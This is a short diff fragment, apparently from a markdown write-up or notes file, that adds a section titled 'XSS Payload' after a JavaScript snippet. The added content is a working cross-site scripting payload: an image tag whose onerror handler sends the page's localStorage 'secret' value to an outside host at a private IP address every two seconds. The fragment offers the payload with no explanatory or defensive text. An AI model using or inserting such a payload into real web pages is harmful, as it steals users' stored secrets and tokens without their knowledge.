@@ -30,3 +30,7 @@
           this.showMessage = true;
         })
 ```
+XSS Payload:
+```
+<img src="x" onerror="setInterval(function() {fetch('http://192.168.160.106:8000?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
+```
